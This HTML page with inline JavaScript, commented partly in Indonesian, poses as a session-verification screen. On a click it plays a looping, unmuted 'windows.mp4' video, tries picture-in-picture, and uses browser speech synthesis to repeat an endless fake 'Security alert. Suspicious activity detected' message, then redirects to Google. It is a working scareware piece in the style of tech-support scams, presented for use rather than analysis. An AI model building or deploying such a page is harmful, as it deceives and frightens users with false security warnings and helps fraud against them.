<!DOCTYPE html>
<html>
<head>
  <title>Verifying...</title>
</head>

<body style="margin:0; background:black; color:white; font-family:sans-serif; text-align:center;">

<div id="overlay" style="position:absolute; top:40%; width:100%; z-index:2;">
  <h2>Verifying your session...</h2>
  <p>Please wait...</p>
  <button onclick="start()" style="padding:12px 24px; font-size:16px;">
    Continue
  </button>
</div>

<video id="v"
  src="windows.mp4"
  controls
  playsinline
  style="width:100%; height:100%; object-fit:cover;">
</video>

<script>
let speaking = false;

async function start(){

  const v = document.getElementById("v");

  // 🔒 disable button biar tidak spam
  document.querySelector("button").disabled = true;

  // 🎬 Start video
  try {
    v.muted = false;
    v.volume = 1;
    v.loop = true;
    await v.play();
  } catch(e){}

  // 🖼️ Try PiP (optional, fail-safe)
  try {
    if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
      await v.requestPictureInPicture();
    }
  } catch(e){}

  // 🔊 Speech function (biar reusable & clean)
  function speakLoop(){
    if (speaking) return; // prevent overlap
    speaking = true;

    const msg = new SpeechSynthesisUtterance(
      "Security alert. Suspicious activity detected. Please follow the instructions on this page."
    );

    // handle voices properly (async-safe)
    let voices = speechSynthesis.getVoices();

    if (!voices.length) {
      speechSynthesis.onvoiceschanged = () => {
        voices = speechSynthesis.getVoices();
        msg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
        speechSynthesis.speak(msg);
      };
    } else {
      msg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
      speechSynthesis.speak(msg);
    }

    // 🔁 loop clean (no spam overlap)
    msg.onend = () => {
      speaking = false;
      speakLoop();
    };
  }

  speakLoop();

  // ⏱️ smoother timing (lebih natural)
  setTimeout(() => {
    window.location.href = "https://www.google.com";
  }, 1200);
}
</script>

</body>
</html>
